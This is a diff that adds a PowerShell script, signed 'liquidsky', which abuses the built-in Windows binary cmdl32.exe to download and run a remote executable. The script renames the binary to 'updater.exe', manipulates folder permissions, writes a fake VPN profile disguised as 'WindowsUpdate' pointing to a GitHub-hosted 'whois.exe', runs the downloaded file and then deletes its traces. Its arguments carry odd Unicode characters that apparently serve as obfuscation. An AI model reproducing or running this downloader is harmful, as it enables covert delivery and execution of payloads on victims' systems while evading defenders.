@@ -1,0 +1,97 @@
+Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
+# Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
+
+# Create a temp directory to work in
+$tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
+New-Item -Path $tempDir -ItemType Directory -Force
+Write-Host "[*] Temporary directory created at $tempDir"
+
+# Copy cmdl32.exe to the temporary directory with a new name
+$cmdl32Source = "C:\Windows\System32\cmdl32.exe"
+$newCmdl32Name = "updater.exe"
+$newCmdl32Path = Join-Path -Path $tempDir -ChildPath $newCmdl32Name
+Write-Host "[*] Copying cmdl32.exe to $tempDir as $newCmdl32Name"
+try {
+    Copy-Item -Path $cmdl32Source -Destination $newCmdl32Path -Force
+    Write-Host "[*] cmdl32.exe copied and renamed to $newCmdl32Name."
+} catch {
+    Write-Host "[!] Failed to copy and rename cmdl32.exe: $($_.Exception.Message)"
+    Exit
+}
+
+# Change to the temp directory
+Set-Location -Path $tempDir
+Write-Host "[*] Working directory changed to $tempDir"
+
+# Deny delete permissions in the temp directory for the current user
+Write-Host "[*] Denying delete permissions for current user"
+icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
+
+# Set the TMP environment variable to the temp directory
+Write-Host "[*] Setting temp environment variable"
+$env:TMP = $tempDir
+
+# Create the VPN settings file
+Write-Host "[*] Creating VPN settings file"
+$settingsContent = @"
+[Connection Manager]
+CMSFile=.vpn
+ServiceName=WindowsUpdate
+TunnelFile=.vpn
+[Settings]
+UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
+"@
+Set-Content -Path "$tempDir\.vpn" -Value $settingsContent
+
+# Use the renamed updater.exe for downloading
+Write-Host "[*] Performing download with $newCmdl32Name"
+$arguments = "`"$tempDir\.vpn`" /vࢯpn /lࢯan"
+try {
+    Start-Process -FilePath $newCmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
+    Write-Host "[*] Download complete with $newCmdl32Name."
+} catch {
+    Write-Host "[!] $newCmdl32Name download failed: $($_.Exception.Message)"
+    # Revert permissions before exiting
+    icacls $tempDir /remove:d "$env:USERNAME"
+    Exit
+}
+
+# Revert permissions
+Write-Host "[*] Reverting permissions"
+icacls $tempDir /remove:d "$env:USERNAME"
+
+# Rename downloaded file for execution
+Write-Host "[*] Renaming downloaded file for execution"
+$downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
+if ($downloadedFile) {
+    Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
+    $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
+    Write-Host "[*] Target path: $targetPath"
+    try {
+        Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
+        Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
+    } catch {
+        Write-Host "[!] Failed to rename file: $($_.Exception.Message)"
+        Exit
+    }
+} else {
+    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
+    Exit
+}
+
+# Execute the downloaded file
+Write-Host "[*] Executing the downloaded file"
+if (Test-Path "$tempDir\whois.exe") {
+    Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
+    Write-Host "[*] Execution complete."
+} else {
+    Write-Host "[!] whois.exe not found after renaming. Exiting script."
+    Exit
+}
+
+# Cleanup
+Write-Host "[*] Cleaning up downloaded file and temporary files"
+Remove-Item -Path "$tempDir\whois.exe" -Force
+Remove-Item -Path "$tempDir\.vpn" -Force
+Remove-Item -Path "$newCmdl32Path" -Force
+Write-Host "[*] Script complete."
